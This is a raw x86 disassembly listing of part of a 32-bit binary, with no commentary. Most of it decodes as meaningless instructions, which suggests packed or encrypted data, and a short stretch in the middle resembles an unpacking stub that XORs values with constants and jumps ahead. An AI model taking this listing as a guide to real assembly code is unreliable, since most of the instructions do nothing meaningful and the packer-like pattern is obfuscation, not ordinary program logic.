  4138c7:	adc    eax,0xcc11eca4
  4138cc:	push   ds
  4138cd:	mov    bh,BYTE PTR [ebp+0x7a]
  4138d0:	div    DWORD PTR [edx+eax*2]
  4138d3:	mov    ds:0x5e0c4026,al
  4138d8:	adc    DWORD PTR [esi-0x19],eax
  4138db:	fistp  QWORD PTR [ebx+0xc8aa1d1]
  4138e1:	mov    ds:0x644a26c,eax
  4138e6:	push   esi
  4138e7:	es add al,0xa0
  4138ea:	fmul   QWORD PTR [edx]
  4138ec:	setno  BYTE PTR [eax-0x71b05b4d]
  4138f3:	aas    
  4138f4:	xchg   ecx,eax
  4138f5:	adc    bl,bh
  4138f7:	xor    BYTE PTR [eax],dh
  4138f9:	pop    ds
  4138fa:	cwde   
  4138fb:	sub    DWORD PTR [eax+ebp*2+0x4d],esi
  4138ff:	ins    BYTE PTR es:[edi],dx
  413900:	iret   
  413901:	loopne 0x413886
  413903:	cs in  al,dx
  413905:	jle    0x4138d2
  413907:	inc    ebp
  413908:	sub    WORD PTR [ecx-0x4c],ax
  41390c:	loope  0x4138d0
  41390e:	fidivr DWORD PTR [esi-0x71ead6af]
  413914:	jmp    0x413949
  413916:	xchg   ebx,eax
  413917:	mov    cl,0xdf
  413919:	jecxz  0x413971
  41391b:	stos   BYTE PTR es:[edi],al
  41391c:	in     eax,0xb3
  41391e:	dec    edx
  41391f:	dec    ecx
  413920:	push   ss
  413921:	xchg   edx,eax
  413922:	call   0x177e57c2
  413927:	out    0x69,eax
  413929:	imul   ebx,DWORD PTR [ebx],0xe9d1f5c6
  41392f:	ror    DWORD PTR [ebx-0x100bb9cd],0x2f
  413936:	sbb    al,0xf8
  413938:	or     DWORD PTR [eax+0x654f2c09],0xfdc94b72
  413942:	xchg   ebp,eax
  413943:	xlat   BYTE PTR ds:[ebx]
  413944:	jne    0x413910
  413946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413947:	sbb    BYTE PTR [ebp+esi*2+0x4d],ch
  41394b:	iret   
  41394c:	mov    ah,0x8f
  41394e:	outs   dx,BYTE PTR ds:[esi]
  41394f:	jl     0x4139ca
  413951:	rol    BYTE PTR [ebp+esi*8+0x37],1
  413955:	mov    dh,0xe3
  413957:	std    
  413958:	mov    dl,BYTE PTR [ebx]
  41395a:	in     eax,dx
  41395b:	loop   0x413993
  41395d:	xlat   BYTE PTR ds:[ebx]
  41395e:	adc    esp,edi
  413960:	mov    dl,dh
  413962:	mov    BYTE PTR [ebx-0x18],bh
  413965:	pop    esp
  413966:	xor    eax,0x287f28e2
  41396b:	inc    ecx
  41396c:	mov    WORD PTR [ecx],ss
  41396e:	loope  0x413903
  413970:	loopne 0x4138f2
  413972:	sbb    DWORD PTR [eax-0x5e],edx
  413975:	mov    dh,al
  413977:	ror    al,1
  413979:	retf   0x7095
  41397c:	(bad)  [eax+0x78c727d2]
  413982:	sub    ah,BYTE PTR [ebp+0x10]
  413985:	inc    ebx
  413986:	fisub  DWORD PTR [edx]
  413988:	xor    eax,0x97d5a1fd
  41398d:	xor    DWORD PTR [edx+0x6c],ebp
  413990:	and    DWORD PTR ds:0xfd5f5540,edi
  413996:	cwde   
  413997:	mov    eax,0x5f2f8d9e
  41399c:	push   eax
  41399d:	pop    esp
  41399e:	mov    ds:0x520819db,eax
  4139a3:	mov    ds:0xb54e6a96,al
  4139a8:	inc    eax
  4139a9:	fucomi st,st(6)
  4139ab:	nop
  4139ac:	jle    0x4139c0
  4139ae:	arpl   bp,di
  4139b0:	xchg   ebp,eax
  4139b1:	rol    DWORD PTR [edx+0x3dfb05e3],cl
  4139b7:	mov    eax,ds:0xd50c4e7
  4139bc:	jns    0x41396d
  4139be:	jmp    0x4139c4
  4139c0:	rol    BYTE PTR [eax-0x53],cl
  4139c3:	sub    eax,0x309bc124
  4139c8:	mov    ebx,0xafbf9dd0
  4139cd:	addr16 xor eax,0xa99e4b74
  4139d3:	pop    ebx
  4139d4:	mov    edi,0x462ba639
  4139d9:	xlat   BYTE PTR ds:[ebx]
  4139da:	leave  
  4139db:	jecxz  0x4139db
  4139dd:	scas   al,BYTE PTR es:[edi]
  4139de:	cdq    
  4139df:	mov    ch,0xa
  4139e1:	jle    0x4139f4
  4139e3:	ja     0x4139d1
  4139e5:	std    
  4139e6:	push   eax
  4139e7:	ds cld 
  4139e9:	jmpw   0x552c
  4139ed:	mov    dh,0x27
  4139ef:	outs   dx,BYTE PTR ds:[esi]
  4139f0:	push   0x84fcc492
  4139f5:	jl     0x413a57
  4139f7:	(bad)  
  4139f9:	cmp    esp,edx
  4139fb:	push   esi
  4139fc:	fnstenv [edi-0x6357bd2a]
  413a02:	fldcw  WORD PTR ss:[eax]
  413a05:	cmp    al,0x46
  413a07:	nop
  413a08:	pop    ecx
  413a09:	ss call 0xda1c728b
  413a0f:	fbld   TBYTE PTR [edi+0x126068af]
  413a15:	cwde   
  413a16:	mov    ah,0x80
  413a18:	push   cs
  413a19:	addr16 push ecx
  413a1b:	or     DWORD PTR [esi-0x27c54106],esp
  413a21:	jl     0x413a45
  413a23:	inc    ecx
  413a24:	sbb    eax,0xeb49d69f
  413a29:	sbb    edx,esi
  413a2b:	mov    ebx,0x26f84e4f
  413a30:	jl     0x4139c5
  413a32:	adc    eax,0x81fb719
  413a37:	les    edx,FWORD PTR [ecx]
  413a39:	lods   al,BYTE PTR ds:[esi]
  413a3a:	sbb    ecx,ebx
  413a3c:	add    ebp,DWORD PTR [ecx+0x45003d91]
  413a42:	pop    ds
  413a43:	mov    dh,0x9e
  413a45:	out    0x37,eax
  413a47:	xchg   ebp,eax
  413a48:	xor    BYTE PTR [esi-0x14b36b9c],ch
  413a4e:	mov    esp,0xb4022b07
  413a53:	sbb    eax,DWORD PTR [esi+ebp*1+0x74fa362]
  413a5a:	mov    ebp,0xd8e8110
  413a5f:	arpl   sp,bx
  413a61:	adc    BYTE PTR [eax],dl
  413a63:	mov    esp,0xa6cf740c
  413a68:	sub    esp,DWORD PTR [ecx]
  413a6a:	imul   ecx,eax,0x1756d1c0
  413a70:	lea    ebp,[edx]
  413a72:	add    bh,dl
  413a74:	fiadd  DWORD PTR gs:[edi]
  413a77:	push   edx
  413a78:	pop    edi
  413a79:	loopne 0x413ab0
  413a7b:	adc    DWORD PTR [esi],0x4b89c480
  413a81:	std    
  413a82:	adc    eax,eax
  413a84:	sar    eax,1
  413a86:	pusha  
  413a87:	xchg   edx,eax
  413a88:	out    dx,eax
  413a89:	sbb    DWORD PTR ds:0xaa0dc439,eax
  413a8f:	xlat   BYTE PTR ds:[ebx]
  413a90:	sbb    dh,BYTE PTR [ebp+ebp*1+0x3b]
  413a94:	(bad)  
  413a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a96:	outs   dx,BYTE PTR ds:[esi]
  413a97:	jns    0x413b12
  413a99:	ds mov esi,0x7575480c
  413a9f:	aaa    
  413aa0:	cmp    al,0xc3
  413aa2:	std    
  413aa3:	shl    cl,0x64
  413aa6:	sbb    DWORD PTR [ebx-0x3],esi
  413aa9:	pop    ecx
  413aaa:	dec    esi
  413aab:	jbe    0x413a79
  413aad:	inc    ebp
  413aae:	call   0x2db8:0xe3e5f72a
  413ab5:	cmovs  ecx,DWORD PTR [ebp+0x4013c18e]
  413abc:	ud2    
  413abe:	(bad)  
  413abf:	ror    esp,1
  413ac1:	dec    ebp
  413ac2:	xlat   BYTE PTR ds:[ebx]
  413ac3:	mov    ebp,0xe553ece0
  413ac8:	rol    esp,1
  413aca:	xor    ebp,DWORD PTR [eax]
  413acc:	data16 mov dh,0x87
  413acf:	fimul  WORD PTR [edx+0x4e]
  413ad2:	and    eax,0x3df3c6f2
  413ad7:	pop    ss
  413ad8:	pusha  
  413ad9:	xor    BYTE PTR [ecx],bh
  413adb:	repz fdivr DWORD PTR [esi-0x58]
  413adf:	ret    0x2bf8
  413ae2:	loopne 0x413b21
  413ae4:	lods   eax,DWORD PTR ds:[esi]
  413ae5:	xor    esi,edx
  413ae7:	push   ebp
  413ae8:	call   0x3cf72204
  413aed:	jbe    0x413b3d
  413aef:	cld    
  413af0:	cmp    edx,ecx
  413af2:	fldcw  WORD PTR [edi+0x47]
  413af5:	bound  ebp,QWORD PTR [esi+0x64]
  413af8:	icebp  
  413af9:	sbb    al,0x29
  413afb:	jecxz  0x413b3d
  413afd:	xor    BYTE PTR [ebx-0x2693052a],ch
  413b03:	jnp    0x413b7c
  413b05:	(bad)  
  413b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b07:	inc    edi
  413b08:	ja     0x413ab7
  413b0a:	add    DWORD PTR [edx-0x670f4450],eax
  413b10:	out    0xbf,eax
  413b12:	sbb    BYTE PTR [edx+0xd14ed5c],bh
  413b18:	ins    BYTE PTR es:[edi],dx
  413b19:	cld    
  413b1a:	stos   BYTE PTR es:[edi],al
  413b1b:	push   edi
  413b1c:	into   
  413b1d:	loop   0x413aef
  413b1f:	or     BYTE PTR [ecx+0xf],0x21
  413b23:	push   ds
  413b24:	lahf   
  413b25:	sub    al,0x77
  413b27:	mov    esp,0xe71b4519
  413b2c:	push   es
  413b2d:	test   eax,0x7bca7ed7
  413b32:	stos   DWORD PTR es:[edi],eax
  413b33:	pop    edx
  413b34:	shl    dl,0x11
  413b37:	lods   eax,DWORD PTR ds:[esi]
  413b38:	int    0xd8
  413b3a:	ret    0x27fb
  413b3d:	jg     0x413ae3
  413b3f:	mov    dl,0x6e
  413b41:	lods   al,BYTE PTR ds:[esi]
  413b42:	or     al,0xcd
  413b44:	lea    ebx,[eax]
  413b46:	fisttp WORD PTR [esi+0x63]
  413b49:	cld    
  413b4a:	add    al,BYTE PTR [edi+0x11]
  413b4d:	scas   eax,DWORD PTR es:[edi]
  413b4e:	dec    ebx
  413b4f:	or     bl,dl
  413b51:	xor    ch,BYTE PTR [eax-0x4d]
  413b54:	sub    BYTE PTR [ebx+0x55adf218],ah
  413b5a:	or     bh,BYTE PTR [ecx-0x7c]
  413b5d:	push   cs
  413b5e:	push   edx
  413b5f:	mov    bh,0xcf
  413b61:	inc    ebx
  413b62:	dec    esp
  413b63:	dec    eax
  413b64:	sbb    eax,0xa5bda9fc
  413b69:	push   ds
  413b6a:	add    al,0xa2
  413b6c:	xchg   ebx,eax
  413b6d:	fisubr WORD PTR ds:0x8db9132a
  413b73:	push   ebx
  413b74:	pop    ebp
  413b75:	js     0x413b63
  413b77:	xchg   ecx,eax
  413b78:	bnd ret 
  413b7a:	jmp    0x4624:0xf0fc9159
  413b81:	jnp    0x413b15
  413b83:	adc    DWORD PTR [ecx+0x63],edx
  413b86:	stc    
  413b87:	jle    0x413b36
  413b89:	fcmovnu st,st(0)
  413b8b:	ror    BYTE PTR [ebx],0xbb
  413b8e:	and    edi,edi
  413b90:	dec    ecx
  413b91:	jecxz  0x413b28
  413b93:	aas    
  413b94:	cdq    
  413b95:	lock ins BYTE PTR es:[edi],dx
  413b97:	mov    edx,0xdd74b38b
  413b9c:	and    eax,0xe8800876
  413ba1:	es pusha 
  413ba3:	pop    esp
  413ba4:	mov    ebp,0x7e0465d
  413ba9:	jo     0x413baa
  413bab:	sub    al,0x9
  413bad:	out    dx,al
  413bae:	cmc    
  413baf:	lahf   
  413bb0:	jle    0x413b3d
  413bb2:	stos   BYTE PTR es:[edi],al
  413bb3:	and    al,BYTE PTR [esi]
  413bb5:	fisttp DWORD PTR [ebx]
  413bb7:	dec    edx
  413bb8:	or     al,BYTE PTR [ecx+0x39ef684a]
  413bbe:	pop    ebx
  413bbf:	xor    eax,0xec823c4c
  413bc4:	mov    ds:0xb517fdf6,al
  413bc9:	jno    0x413c3b
  413bcb:	adc    eax,0x4327243d
  413bd0:	ja     0x413c51
  413bd2:	adc    esi,ecx
  413bd4:	jge    0x413c26
  413bd6:	enter  0x6344,0x6
  413bda:	and    DWORD PTR [edi+0x6b],edx
  413bdd:	sar    BYTE PTR [ecx-0x3],1
  413be0:	sub    BYTE PTR [eax],ch
  413be2:	pop    edx
  413be3:	mov    edx,DWORD PTR ds:0xdf4ca158
  413be9:	sub    esp,0x7c
  413bec:	hlt    
  413bed:	and    ah,BYTE PTR [esi-0x7b]
  413bf0:	clc    
  413bf1:	sbb    BYTE PTR [edi],0xf8
  413bf4:	inc    ecx
  413bf5:	push   edi
  413bf6:	test   al,0x3b
  413bf8:	mov    edx,0x62506ba2
  413bfd:	ins    DWORD PTR es:[edi],dx
  413bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bff:	push   cs
  413c00:	jg     0x413c1c
  413c02:	test   eax,0x8245efcd
  413c07:	test   DWORD PTR [ebx+0x33],ecx
  413c0a:	sbb    esp,0xbbbf28a8
  413c10:	sahf   
  413c11:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c13:	pop    ss
  413c14:	ss nop
  413c16:	xlat   BYTE PTR ds:[ebx]
  413c17:	lahf   
  413c18:	or     al,0xba
  413c1a:	out    dx,al
  413c1b:	mov    ds:0x8b5cf4f9,al
  413c20:	scas   eax,DWORD PTR es:[edi]
  413c21:	(bad)  
  413c22:	jnp    0x413c68
  413c24:	hlt    
  413c25:	cmp    BYTE PTR [esi+0x1b810d08],dh
  413c2b:	mov    esp,0x86d85fcf
  413c30:	inc    ebp
  413c31:	adc    esp,DWORD PTR ds:0x80929a3c
  413c37:	push   eax
  413c38:	sbb    ah,BYTE PTR [eax+0x5d]
  413c3b:	pause  
  413c3d:	stos   DWORD PTR es:[edi],eax
  413c3e:	call   0x37b1:0x7c1aa623
  413c45:	jp     0x413c09
  413c47:	adc    al,0x14
  413c49:	or     eax,0x312ddea4
  413c4e:	loope  0x413be0
  413c50:	xchg   esi,eax
  413c51:	into   
  413c52:	xchg   ebp,eax
  413c53:	addr16 ret 
  413c55:	stos   DWORD PTR es:[edi],eax
  413c56:	pop    esp
  413c57:	imul   esi,edx,0x389b5198
  413c5d:	call   0x8abe8200
  413c62:	mov    esi,DWORD PTR [ecx]
  413c64:	rol    DWORD PTR [ebx],0x5d
  413c67:	dec    eax
  413c68:	xchg   ebx,eax
  413c69:	scas   eax,DWORD PTR es:[edi]
  413c6a:	jns    0x413c19
  413c6c:	adc    DWORD PTR ds:0xfcd63dd8,edx
  413c72:	loop   0x413cf2
  413c74:	add    dl,BYTE PTR [ebx+0x39]
  413c77:	inc    esi
  413c78:	and    dx,WORD PTR [edi]
  413c7b:	or     BYTE PTR [edx+0xd],al
  413c7e:	pop    eax
  413c7f:	out    dx,al
  413c80:	(bad)  
  413c82:	inc    esp
  413c83:	(bad)  
  413c84:	out    0x33,eax
  413c86:	das    
  413c87:	push   esp
  413c88:	adc    BYTE PTR [edx],cl
  413c8a:	into   
  413c8b:	pop    esp
  413c8c:	fwait
  413c8d:	and    DWORD PTR [eax+0x37],esi
  413c90:	jae    0x4b1f8e60
  413c96:	aad    0x6d
  413c98:	and    BYTE PTR ds:0xf8e25096,cl
  413c9e:	lea    ecx,[ebp-0x2cd9fd51]
  413ca4:	mov    edi,0x5d962693
  413ca9:	dec    edx
  413caa:	or     ebp,DWORD PTR [esi+0x76]
  413cad:	mov    dl,0x35
  413caf:	pushf  
  413cb0:	or     esp,DWORD PTR [ecx]
  413cb2:	mov    BYTE PTR [edi],dh
  413cb4:	mov    ebx,0xec335ce2
  413cb9:	repz call 0x1ce5275c
  413cbf:	inc    edx
  413cc0:	lock xrelease and WORD PTR [edx+ebp*2-0x1b39fbb7],si
  413cca:	and    al,BYTE PTR [ebx+0x19]
  413ccd:	shl    BYTE PTR [edi+edx*4-0x40],cl
  413cd1:	in     eax,0x6d
  413cd3:	push   esi
  413cd4:	mov    fs,WORD PTR [eax+ebx*8+0x76]
  413cd8:	or     al,0xd
  413cda:	(bad)  
  413cdb:	or     cl,BYTE PTR [esi+ebx*2-0x14]
  413cdf:	push   eax
  413ce0:	push   cs
  413ce1:	repz arpl WORD PTR [ebx],bx
  413ce4:	xor    eax,0xe80875e2
  413ce9:	xchg   esp,eax
  413cea:	test   DWORD PTR [esi-0x56],ecx
  413ced:	nop
  413cee:	ror    esi,cl
  413cf0:	sub    esi,DWORD PTR [edi-0x3878f0eb]
  413cf6:	inc    ecx
  413cf7:	div    DWORD PTR [eax+0x15]
  413cfa:	pmullw mm1,QWORD PTR [ecx]
  413cfd:	test   eax,0x143da92e
  413d02:	mov    edi,0x1c02f63e
  413d07:	jp     0x413d75
  413d09:	loope  0x413d46
  413d0b:	add    ecx,DWORD PTR [esi]
  413d0d:	(bad)  
  413d0e:	ja     0x413d75
  413d10:	outs   dx,BYTE PTR ds:[esi]
  413d11:	pusha  
  413d12:	cmp    eax,0xfa174106
  413d17:	mov    edi,0x87a2c415
  413d1c:	inc    ebp
  413d1d:	sbb    DWORD PTR ds:0xe725ac9,eax
  413d23:	xchg   BYTE PTR [esi+0xb],ah
  413d26:	dec    eax
  413d27:	adc    al,0x2e
  413d29:	nop
  413d2a:	and    al,0x9d
  413d2c:	cmp    eax,0xe3026080
  413d31:	push   ss
  413d32:	push   ebp
  413d33:	jno    0x413d2d
  413d35:	ja     0x413ce2
  413d37:	sbb    BYTE PTR [ebp+0x7d],bl
  413d3a:	pop    eax
  413d3b:	add    eax,0x5873543f
  413d40:	pop    eax
  413d41:	xchg   edi,eax
  413d42:	(bad)  
  413d44:	stc    
  413d45:	mov    DWORD PTR [ebx+0x64],edx
  413d48:	arpl   cx,dx
  413d4a:	add    DWORD PTR [esi-0x51],0x6e
  413d4e:	inc    edi
  413d4f:	rcr    ebx,1
  413d51:	mov    ch,0xcb
  413d53:	(bad)  
  413d54:	les    ebp,FWORD PTR [edi]
  413d56:	lahf   
  413d57:	cmp    DWORD PTR [ebx+eiz*8-0x46],ebx
  413d5b:	popa   
  413d5c:	sub    BYTE PTR [esi-0x6f30b2ee],ch
  413d62:	ss lahf 
  413d64:	push   0x386f4487
  413d69:	or     DWORD PTR ds:[edx-0x3e],ebx
  413d6d:	outs   dx,BYTE PTR ds:[esi]
  413d6e:	or     esi,DWORD PTR [esi+eiz*4]
  413d71:	pusha  
  413d72:	cmc    
  413d73:	callw  0x92d8
  413d77:	neg    DWORD PTR [edx+edx*1+0x4195ab1b]
  413d7e:	sub    ebx,ecx
  413d80:	xchg   ebx,ecx
  413d82:	dec    ecx
  413d83:	dec    ecx
  413d84:	mov    eax,DWORD PTR [ebp-0x1c]
  413d87:	imul   eax,ecx
  413d8a:	add    esp,eax
  413d8c:	xchg   edx,eax
  413d8d:	push   eax
  413d8e:	xor    ebx,ebx
  413d90:	mov    edx,esp
  413d92:	dec    edx
  413d93:	inc    ebx
  413d94:	add    ebx,DWORD PTR [edx+ebx*1]
  413d97:	dec    ebx
  413d98:	xor    edx,edx
  413d9a:	add    DWORD PTR [ebp-0x10],ebx
  413d9d:	pop    ebx
  413d9e:	mov    eax,DWORD PTR [ebp-0x10]
  413da1:	pop    edi
  413da2:	pop    esi
  413da3:	pop    ebx
  413da4:	leave  
  413da5:	ret    0x10
  413da8:	push   ebp
  413da9:	mov    ebp,esp
  413dab:	push   ecx
  413dac:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413db3:	sub    DWORD PTR ds:0x42a2e6,ebx
  413db9:	mov    eax,DWORD PTR [ebp-0x4]
  413dbc:	and    DWORD PTR ds:0x42a2e6,0x0
  413dc6:	jmp    0x413dd8
  413dcb:	mov    edx,DWORD PTR ds:0x42a2e6
  413dd1:	inc    edx
  413dd2:	mov    DWORD PTR ds:0x42a2e6,edx
  413dd8:	cmp    DWORD PTR ds:0x42a2e6,0x1a
  413ddf:	jae    0x413e0a
  413de5:	cmp    DWORD PTR ds:0x42a2e6,0x2a
  413dec:	ja     0x413e0a
  413df2:	jmp    0x413e05
  413df7:	push   DWORD PTR [ebp-0x10]
  413dfa:	push   0x42a27e
  413dff:	call   DWORD PTR ds:0x42a3ce
  413e05:	jmp    0x413dcb
  413e0a:	mov    edx,DWORD PTR [ebp+0x10]
  413e0d:	mov    ecx,0x75108aa
  413e12:	xor    eax,ecx
  413e14:	sbb    DWORD PTR ds:0x42a2aa,0x2976
  413e1e:	add    eax,0x3272f1
  413e23:	xor    DWORD PTR ds:0x42a272,0x42a2b6
  413e2d:	mov    DWORD PTR [edx],eax
  413e2f:	mov    eax,DWORD PTR [ebp+0xc]
  413e32:	and    edx,DWORD PTR ds:0x42a2f2
  413e38:	xor    eax,ecx
  413e3a:	and    DWORD PTR ds:0x42a2de,edi
  413e40:	push   esi
  413e41:	mov    esi,DWORD PTR [ebp+0x10]
  413e44:	mov    edx,0x3272f1
  413e49:	add    eax,edx
  413e4b:	mov    DWORD PTR [esi+0x4],eax
  413e4e:	mov    eax,DWORD PTR [ebp+0x14]
  413e51:	mov    esi,DWORD PTR [ebp+0x10]
  413e54:	mov    DWORD PTR [esi+0x8],eax
  413e57:	mov    eax,DWORD PTR [ebp+0x18]
  413e5a:	mov    esi,DWORD PTR [ebp+0x10]
  413e5d:	mov    DWORD PTR [esi+0xc],eax
  413e60:	mov    eax,DWORD PTR [ebp+0x1c]
  413e63:	mov    esi,DWORD PTR [ebp+0x10]
  413e66:	mov    DWORD PTR [esi+0x10],eax
  413e69:	mov    eax,DWORD PTR [ebp+0x8]
  413e6c:	xor    eax,ecx
  413e6e:	add    eax,edx
  413e70:	jmp    0x416225
  413e75:	mov    esi,ebx
  413e77:	push   ebx
  413e78:	push   esi
  413e79:	or     edx,esi
  413e7b:	xchg   BYTE PTR [esi+0x72f8d7bb],ch
  413e81:	jo     0x413ee0
  413e83:	and    ecx,DWORD PTR [esp+edx*4]
  413e86:	gs jl  0x413e0c
  413e89:	jmp    0x413ee9
  413e8b:	add    DWORD PTR [ebx+0x7ff11e63],0xffffffe9
  413e92:	ds dec esp
  413e94:	repnz repz lahf 
  413e97:	mov    ebp,0x6dfa6f0c
  413e9c:	push   ecx
  413e9d:	cld    
  413e9e:	add    eax,0xefbf5d82
  413ea3:	xchg   esp,eax
  413ea4:	and    BYTE PTR ds:0x46efc790,ch
  413eaa:	jo     0x413ef9
  413eac:	arpl   WORD PTR [ebp+0x78959bdd],cx
  413eb2:	jns    0x413f26
  413eb4:	inc    ecx
  413eb5:	inc    eax
  413eb6:	std    
  413eb7:	sbb    dl,bh
  413eb9:	addr16 xchg ebp,eax
  413ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebc:	js     0x413f26
  413ebe:	xlat   BYTE PTR ds:[ebx]
  413ebf:	scas   eax,DWORD PTR es:[edi]
  413ec0:	or     BYTE PTR [eax+0x6a],bh
  413ec3:	xor    DWORD PTR [ecx+ebx*2-0x4],edx
  413ec7:	or     DWORD PTR [ebx],esi
  413ec9:	test   DWORD PTR [edi+0x6ad0e847],0x8b90f5e8
  413ed3:	mov    ebx,ebp
  413ed5:	fld    DWORD PTR [edi]
  413ed7:	add    bh,0x59
  413eda:	mov    eax,ds:0xb75f6ba3
  413edf:	aad    0xb6
  413ee1:	lea    ebp,[ebp+0x3aadc5c8]
  413ee7:	out    dx,eax
  413ee8:	sub    DWORD PTR [ebx],ebp
  413eea:	stc    
  413eeb:	fbstp  TBYTE PTR [edx+0x581ca7e4]
  413ef1:	leave  
  413ef2:	std    
  413ef3:	adc    al,0x18
  413ef5:	(bad)  
  413ef6:	pop    eax
  413ef7:	push   ebx
  413ef8:	fcmovu st,st(4)
  413efa:	leave  
  413efb:	and    ebp,DWORD PTR [edx-0x5f]
  413efe:	push   ds
  413eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f00:	xchg   esi,eax
  413f01:	jg     0x413f59
  413f03:	out    dx,al
  413f04:	cwde   
  413f05:	hlt    
  413f06:	xor    dh,ch
  413f08:	push   ebx
  413f09:	mov    dh,0x56
  413f0b:	push   ebp
  413f0c:	mov    ?,WORD PTR [edi-0x5c55a481]
  413f12:	daa    
  413f13:	add    bh,bh
  413f15:	dec    ebx
  413f16:	cwde   
  413f17:	shr    BYTE PTR [edi-0x6e],1
  413f1a:	in     eax,0xfa
  413f1c:	xchg   edi,eax
  413f1d:	pop    ss
  413f1e:	xchg   ecx,eax
  413f1f:	aas    
  413f20:	jmp    edi
  413f22:	ret    0xa2e3
  413f25:	jge    0x413f16
  413f27:	dec    esi
  413f28:	(bad)  
  413f29:	out    0x18,eax
  413f2b:	sub    al,0x67
  413f2d:	pop    es
  413f2e:	punpckhwd mm5,QWORD PTR [eax]
  413f31:	sahf   
  413f32:	pop    ecx
  413f33:	retf   
  413f34:	mov    al,ds:0x8a959dbd
  413f39:	add    BYTE PTR [edi-0x5b],ah
  413f3c:	inc    edi
  413f3d:	adc    eax,0xaa11a0d7
  413f42:	dec    esp
  413f43:	mov    gs,WORD PTR [esi]
  413f45:	dec    eax
  413f46:	push   0xffffffcb
  413f48:	test   al,0x9e
  413f4a:	imul   edx,DWORD PTR [edi+0x499ebb04],0x1d
  413f51:	loope  0x413fcf
  413f53:	ins    DWORD PTR es:[edi],dx
  413f54:	test   ecx,esi
  413f56:	dec    ecx
  413f57:	mov    dh,0xbb
  413f59:	daa    
  413f5a:	cdq    
  413f5b:	adc    eax,0xaa2163e0
  413f60:	mov    ds:0xd5e6aac3,al
  413f65:	adc    eax,0xcd03d368
  413f6a:	dec    edx
  413f6b:	jo     0x413f83
  413f6d:	push   esp
  413f6e:	lods   eax,DWORD PTR ds:[esi]
  413f6f:	or     al,0x56
  413f71:	mov    edx,0x5aabaff1
  413f76:	adc    eax,0x2f15d908
  413f7b:	inc    esp
  413f7c:	mov    ebp,DWORD PTR [ebp+0x2]
  413f7f:	in     eax,dx
  413f80:	(bad)  
  413f81:	cdq    
  413f82:	sub    ch,BYTE PTR [ecx+0x49]
  413f85:	sbb    DWORD PTR [eax-0x2a67b923],ebx
  413f8b:	and    dl,BYTE PTR [ebx]
  413f8d:	mov    dl,0x44
  413f8f:	adc    ebp,DWORD PTR [eax+edi*1+0x41308ae0]
  413f96:	sbb    bh,BYTE PTR [eax+0x3134b9e3]
  413f9c:	pop    ebp
  413f9d:	ss ret 
  413f9f:	dec    edx
  413fa0:	sbb    WORD PTR [eax-0x7],ax
  413fa4:	or     bl,BYTE PTR [eax+ebx*2+0x1a]
  413fa8:	in     al,dx
  413fa9:	call   0xf4ea:0x69689e84
  413fb0:	retf   
  413fb1:	jns    0x413fbf
  413fb3:	ja     0x413f6e
  413fb5:	out    0x46,al
  413fb7:	inc    edi
  413fb8:	and    DWORD PTR [ecx+0x61],0x7c3cbbc0
  413fbf:	xchg   ebx,eax
  413fc0:	pop    edi
  413fc1:	cmp    bh,al
  413fc3:	mov    dh,BYTE PTR [ebx]
  413fc5:	xchg   edx,eax
  413fc6:	test   BYTE PTR [eax-0x3b],0x65
  413fca:	sar    dl,cl
  413fcc:	idiv   DWORD PTR [esi-0xe]
  413fcf:	int3   
  413fd0:	cmp    BYTE PTR [esi-0x2e],ch
  413fd3:	scas   al,BYTE PTR es:[edi]
  413fd4:	jmp    0xc3069ae0
  413fd9:	xchg   esi,eax
  413fdb:	hlt    
  413fdc:	or     eax,DWORD PTR [eax+edi*2]
  413fdf:	sar    BYTE PTR [edx+ebp*2-0x3951981b],cl
  413fe6:	js     0x413ffc
  413fe8:	add    bl,ah
  413fea:	lahf   
  413feb:	into   
  413fec:	outs   dx,DWORD PTR es:[esi]
  413fee:	es pop ss
  413ff0:	cmp    ecx,ebp
  413ff2:	dec    ecx
  413ff3:	cli    
  413ff4:	pop    eax
  413ff5:	clc    
  413ff6:	(bad)  
  413ff7:	mov    gs,WORD PTR [eax-0x6226ec55]
  413ffd:	pushf  
  413ffe:	dec    esi
  413fff:	(bad)  
  414000:	sbb    DWORD PTR [ebx-0x349449a0],ecx
  414006:	adc    cl,al
  414008:	add    bl,BYTE PTR [ebx+ebp*1]
  41400b:	pop    es
  41400c:	xchg   esp,eax
  41400d:	jno    0x413fee
  41400f:	fnsave [edx-0x70b0269a]
  414015:	es cmc 
  414017:	rcr    DWORD PTR [esi-0x1fd1a876],1
  41401d:	push   0x57
  41401f:	and    eax,0xfe7df3fb
  414024:	xor    edi,DWORD PTR [edx+0x6d]
  414027:	in     al,0x19
  414029:	rcl    cl,cl
  41402b:	or     al,0x31
  41402d:	sub    DWORD PTR [edi+0x71],ecx
  414030:	jns    0x413fef
  414032:	ds cmp al,ah
  414035:	xchg   ebp,eax
  414036:	(bad)  
  414037:	xor    cl,ch
  414039:	dec    bl
  41403b:	jge    0x414094
  41403d:	xor    bl,BYTE PTR [ebx-0x4d]
  414040:	xor    esi,DWORD PTR [esi+0x2a]
  414043:	and    bh,dh
  414045:	push   cs
  414046:	in     eax,dx
  414047:	and    cl,BYTE PTR ds:0x98d8b634
  41404d:	stos   BYTE PTR es:[edi],al
  41404e:	out    0x25,eax
  414050:	mov    al,ds:0xee599e1d
  414055:	loop   0x414038
  414057:	sub    al,0x7c
  414059:	pop    esp
  41405a:	call   0x66ada39d
  41405f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414060:	(bad)  
  414061:	jo     0x414051
  414063:	xor    eax,0xb0d31f14
  414068:	shr    ebx,1
  41406a:	push   es
  41406b:	aaa    
  41406c:	mov    DWORD PTR [edi+0x4],eax
  41406f:	sbb    DWORD PTR [edi+esi*8],0x6c06b8dc
  414076:	in     eax,0xf4
  414078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414079:	pushf  
  41407a:	mov    BYTE PTR [ebp-0x68a599a6],ah
  414080:	sub    al,0x9d
  414082:	popa   
  414083:	stos   BYTE PTR es:[edi],al
  414084:	adc    BYTE PTR [ebx],0xca
  414087:	pop    eax
  414088:	icebp  
  414089:	int    0x82
  41408b:	mov    eax,ds:0x846c818a
  414090:	jecxz  0x414072
  414092:	sti    
